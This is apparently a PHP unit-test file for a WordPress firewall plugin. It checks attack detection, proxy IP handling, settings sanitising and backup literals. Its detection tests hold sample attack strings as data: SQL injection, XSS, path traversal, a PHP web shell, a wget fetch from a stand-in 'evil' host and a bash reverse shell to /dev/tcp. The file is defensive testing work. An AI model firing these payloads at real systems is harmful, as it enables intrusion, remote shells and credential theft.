<?php
/**
 * Unit tests: firewall signatures, IP handling, settings and backup literals.
 *
 * @package ZenZeiTenBastion
 */

// phpcs:disable

use ZenZeiTenBastion\Backup;
use ZenZeiTenBastion\Firewall;
use ZenZeiTenBastion\IP;
use ZenZeiTenBastion\Plugin;
use ZenZeiTenBastion\Settings;

function zbst_args( $value ) {
	return Firewall::inspect( array( 'args' => array( $value ) ) );
}

function test_firewall_catches_attacks() {
	$attacks = array(
		'sqli-union'     => array( "1 UNION SELECT user_pass FROM wp_users", "1 union all select 1,2", "-1' UnIoN(SeLeCt 1)", '1%20UNION%20SELECT%201', '1/**/UNION/**/SELECT/**/1' ),
		'sqli-blind'     => array( "1 AND SLEEP(5)", "1' AND benchmark(1000000,md5(1))", "1'; WAITFOR DELAY '0:0:5'--" ),
		'sqli-tautology' => array( "' OR 1=1--", "admin' or 'a'='a", '" OR "x"="x', "') or ('1'='1" ),
		'sqli-schema'    => array( 'SELECT table_name FROM information_schema.tables', "LOAD_FILE('/etc/hosts')", 'select 1 into outfile', '@@version', "extractvalue(1,concat(0x7e,version()))" ),
		'xss-script'     => array( '<script>alert(1)</script>', '%3Cscript%3Ealert(1)%3C/script%3E', '%253Cscript%253E', '&lt;script&gt;alert(1)' ),
		'xss-tag'        => array( '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<iframe src="//evil">', '<body onload="x()">' ),
		'xss-scheme'     => array( 'javascript:alert(1)', '"javascript:alert(1)', ' JaVaScRiPt :alert(1)' ),
		'lfi-traversal'  => array( '../../../../etc/hosts', '..\\..\\windows\\system32', '=../wp-config.php' ),
		'lfi-files'      => array( '/etc/passwd', '/proc/self/environ', 'c:\\windows\\win.ini' ),
		'lfi-wrapper'    => array( 'php://filter/convert.base64-encode/resource=index', 'phar://x.jpg', 'expect://id' ),
		'rce-shell'      => array( '; cat /etc/hosts', '| wget http://evil/x.sh', '`curl -s http://x`', '$(whoami)', "x; bash -i >& /dev/tcp/1.2.3.4/80 0>&1" ),
		'rce-php'        => array( '<?php system($_GET[c]); ?>', 'eval(base64_decode("ZWNobw=="))', 'assert($_POST[x])' ),
		'rce-template'   => array( '${jndi:ldap://evil/a}', '{{7*7}}', '${7*7}' ),
		'php-object'     => array( 'O:8:"stdClass":1:{s:1:"a";i:1;}', 'a:1:{i:0;O:4:"Evil":0:{}}', 'C:11:"ArrayObject":21:{x}' ),
		'null-byte'      => array( "file.php\0.jpg", 'file.php%00.jpg' ),
	);
	foreach ( $attacks as $rule => $samples ) {
		foreach ( $samples as $sample ) {
			$m = zbst_args( $sample );
			check( null !== $m, "{$rule} missed: {$sample}" );
		}
	}
	// The specific rules, where samples could match more than one rule.
	check_same( 'sqli-union', zbst_args( '1 UNION SELECT 1' )['rule'] );
	check_same( 'php-object', zbst_args( 'O:8:"stdClass":0:{}' )['rule'] );
	check_same( 'xss-script', zbst_args( '<script>x</script>' )['rule'] );
}

function test_firewall_other_targets() {
	check_same( 'scanner-ua', Firewall::inspect( array( 'ua' => 'sqlmap/1.7.2#stable (https://sqlmap.org)' ) )['rule'] );
	check_same( 'scanner-ua', Firewall::inspect( array( 'ua' => 'WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)' ) )['rule'] );
	check_same( 'rce-template', Firewall::inspect( array( 'ua' => '${jndi:ldap://x/a}' ) )['rule'] );
	foreach ( array( '/.env', '/.git/config', '/wp-config.php.bak', '/wp-config.php~', '/backup-2024.sql.gz', '/db.sql', '/wp-content/debug.log', '/phpinfo.php', '/.htpasswd' ) as $path ) {
		$m = Firewall::inspect( array( 'path' => $path ) );
		check( $m && 'sensitive-file' === $m['rule'], "missed probe {$path}" );
	}
	foreach ( array( 'shell.php', 'x.phtml', 'a.php.jpg', 'evil.phar', '.htaccess', 'b.PHP5' ) as $name ) {
		$m = Firewall::inspect( array( 'files' => array( $name ) ) );
		check( $m && 'upload-script' === $m['rule'], "missed upload {$name}" );
	}
	check_same( 'sqli-union', Firewall::inspect( array( 'cookies' => array( "x' union select 1" ) ) )['rule'] );
	check_same( 'xss-script', Firewall::inspect( array( 'uri' => '/search/?q=%3Cscript%3Ealert(1)' ) )['rule'] );
}

function test_firewall_allows_normal_traffic() {
	$normal = array(
		"O'Reilly and Sons", "Don't select this, it's a union station question", 'Union Street 5, Select Hotel',
		'1 + 1 = 2', "I'd like to order 2 or 3", 'email@example.com', 'https://example.com/?a=b&c=d',
		'<p>Hello <strong>world</strong></p>', '../images/photo.png', 'cat food | dog food', 'I learned JavaScript today',
		'{"name":"Budi","qty":2}', 'Rp 150.000,00', 'Jl. Sudirman No. 1, Jakarta', 'C:\\Users\\budi\\Documents',
		'50% off & free shipping', 'The /etc folder on Linux', 'sleep well tonight', 'we use curl and wget daily',
		'a:2:{i:0;s:1:"a";i:1;s:1:"b";}', 'Order #1234; thanks', 'Price: $(5) each', 'or 1 = 2 maybe', 'onboarding=done',
		'ini settings', 'my.php.notes', 'my dog; cat lovers / dog lovers', 'I learned JavaScript: it is great',
		'Tom | curl up with a book', 'Python: a; python lovers meetup', 'Selamat pagi, apa kabar?', 'こんにちは', '{{ name }}', '${price}',
	);
	foreach ( $normal as $value ) {
		$m = zbst_args( $value );
		check( null === $m, 'false alarm on "' . $value . '": ' . ( $m ? $m['rule'] : '' ) );
	}
	foreach ( array( '/', '/shop/product-1/', '/wp-content/uploads/2024/05/env.jpg', '/blog/how-to-use-git/', '/environment/', '/wp-config-guide/' ) as $path ) {
		check( null === Firewall::inspect( array( 'path' => $path ) ), "false alarm on path {$path}" );
	}
	foreach ( array( 'photo.jpg', 'report.pdf', 'php-guide.pdf', 'archive.zip' ) as $name ) {
		check( null === Firewall::inspect( array( 'files' => array( $name ) ) ), "false alarm on upload {$name}" );
	}
	check( null === Firewall::inspect( array( 'ua' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' ) ) );
}

function test_firewall_disabled_rule_is_skipped() {
	check( null === Firewall::inspect( array( 'args' => array( '<script>x</script>' ) ), array( 'xss-script' ) ) );
	check( null !== Firewall::inspect( array( 'args' => array( '<script>x</script>' ) ), array( 'xss-tag' ) ) );
}

function test_firewall_reports_worst_match() {
	// XSS (high) and SQL injection (critical) together: the critical one is reported.
	$m = Firewall::inspect( array( 'args' => array( '<script>x</script>', '1 UNION SELECT 2' ) ) );
	check_same( 'sqli-union', $m['rule'] );
	check_same( 4, $m['severity'] );
}

function test_firewall_flatten_includes_keys_and_nesting() {
	$flat = Firewall::flatten( array( 'a' => array( 'b' => array( '<script>' => 'x' ) ) ) );
	check( in_array( '<script>', $flat, true ) );
	check( null !== Firewall::inspect( array( 'args' => $flat ) ) );
}

function test_firewall_long_values_are_bounded() {
	$start = microtime( true );
	zbst_args( str_repeat( "a' or b ", 200000 ) );
	check( microtime( true ) - $start < 2.0, 'inspection too slow on a large value' );
}

function test_ip_resolution_trusts_only_proxies() {
	$server = array( 'REMOTE_ADDR' => '198.51.100.1', 'HTTP_X_FORWARDED_FOR' => '1.2.3.4, 203.0.113.9' );
	check_same( '198.51.100.1', IP::resolve( $server, array(), 'X-Forwarded-For' ) );
	check_same( '203.0.113.9', IP::resolve( $server, array( '198.51.100.0/24' ), 'X-Forwarded-For' ) );
	// A client cannot hide behind a value it prepended itself.
	$server['HTTP_X_FORWARDED_FOR'] = '1.2.3.4, 10.0.0.5';
	check_same( '1.2.3.4', IP::resolve( $server, array( '198.51.100.0/24', '10.0.0.0/8' ), 'X-Forwarded-For' ) );
	check( IP::in_range( '2001:db8::5', '2001:db8::/32' ) );
	check( ! IP::in_range( '2001:db9::5', '2001:db8::/32' ) );
}

function test_settings_sanitize_clamps_and_cleans() {
	$s = Settings::sanitize(
		array(
			'firewall_mode'      => 'nonsense',
			'login_max_failures' => '-4',
			'score_threshold'    => '99999',
			'allowlist'          => "203.0.113.0/24 # office\nnot-an-ip\n2001:db8::1",
			'alert_email'        => 'bad email',
			'enabled_rules'      => array( '', 'sqli-union' ),
			'unknown_key'        => 'x',
			'xmlrpc'             => 'off',
		)
	);
	check_same( 'protect', $s['firewall_mode'] );
	check_same( 1, $s['login_max_failures'] );
	check_same( 1000, $s['score_threshold'] );
	check_same( "203.0.113.0/24\n2001:db8::1", $s['allowlist'] );
	check_same( '', $s['alert_email'] );
	check( ! in_array( 'sqli-union', $s['disabled_rules'], true ) );
	check( in_array( 'xss-script', $s['disabled_rules'], true ) );
	check( ! isset( $s['unknown_key'] ) );
	check_same( 'off', $s['xmlrpc'] );
	check_same( array(), Settings::sanitize( array( 'disabled_rules' => array( 'made-up' ) ) )['disabled_rules'] );
}

function test_backup_literal_is_portable() {
	check_same( 'NULL', Backup::literal( null ) );
	check_same( "''", Backup::literal( '' ) );
	check_same( "'it''s'", Backup::literal( "it's" ) );
	check_same( "'42'", Backup::literal( 42 ) );
	check_same( "X'615c62'", Backup::literal( 'a\\b' ) );
	check_same( "X'610a62'", Backup::literal( "a\nb" ) );
	check_same( "X'c3a9'", Backup::literal( 'é' ) );
	check_same( '`we``ird`', Backup::quote_name( 'we`ird' ) );
}

function test_wporg_update_offer_is_dropped() {
	$t           = new stdClass();
	$t->response = array(
		'zenzeiten-bastion/zenzeiten-bastion.php' => (object) array( 'new_version' => '9.9' ),
		'other/other.php'                         => (object) array( 'new_version' => '2.0' ),
	);
	$t->no_update = array( 'zenzeiten-bastion/zenzeiten-bastion.php' => (object) array() );
	$t            = Plugin::drop_wporg_update( $t );
	check( ! isset( $t->response['zenzeiten-bastion/zenzeiten-bastion.php'] ) );
	check( isset( $t->response['other/other.php'] ) );
	check( empty( $t->no_update ) );
	check_same( false, Plugin::drop_wporg_update( false ) );
}
